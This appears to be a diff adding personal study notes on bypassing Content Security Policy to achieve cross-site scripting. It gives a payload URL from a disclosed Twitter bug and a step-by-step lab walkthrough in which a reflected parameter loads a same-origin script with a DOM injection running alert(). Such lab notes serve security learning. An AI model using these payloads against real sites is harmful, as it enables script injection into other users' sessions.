@@ -1,0 +1,34 @@
+CSP makes it possible for server administrators to reduce or eliminate the vectors by which XSS can occur by specifying the domains that the browser should consider to be valid sources of executable scripts. A CSP compatible browser will then only execute scripts loaded in source files received from those allowlisted domains, ignoring all other script (including inline scripts and event-handling HTML attributes).
+
+https://portswigger.net/research/bypassing-csp-with-policy-injection
+https://hackerone.com/reports/153666
+
+payload:
+
+https://careers.twitter.com/en/jobs-search.html?location=1%22%3E%3Cscript%20src=//analytics.twitter.com/tpm?tpm_cb=alert%28document.domain%29%3E//
+
+steps:
+
+    find the XSS
+    find another page that could allow you to add JavaScript
+    load the other page via a script tag in the initial page.
+
+~~~
+
+xss, but script doesn't work in the index page:
+libcurl.so/?name=<h2>asf
+libcurl.so/?name=<script>alert('2fdb31a2-ca58-4650-abfb-9406be061d69')</script>
+libcurl.so/js/countdown.php?end=2534926825 => var countDownDate = new Date(2534926825*1000).getTime();
+libcurl.so/?name=<script>alert('2fdb31a2-ca58-4650-abfb-9406be061d69')</script>
+
+found another page in the source:
+<script src="/js/countdown.php?end=2534926825"></script>
+
+
+it has dom xss:
+<script src="/js/countdown.php?end=);alert(1)%0a%0a//"></script>
+libcurl.so/?name=<script src="/js/countdown.php?end=);alert(1)%0a%0a//"></script>
+
+
+used to reference to vulnerable script in original page:
+ptl-792e947b-398b8094.libcurl.so/?name=<script src="/js/countdown.php?end=);alert('2fdb31a2-ca58-4650-abfb-9406be061d69')%0a%0a//"></script>
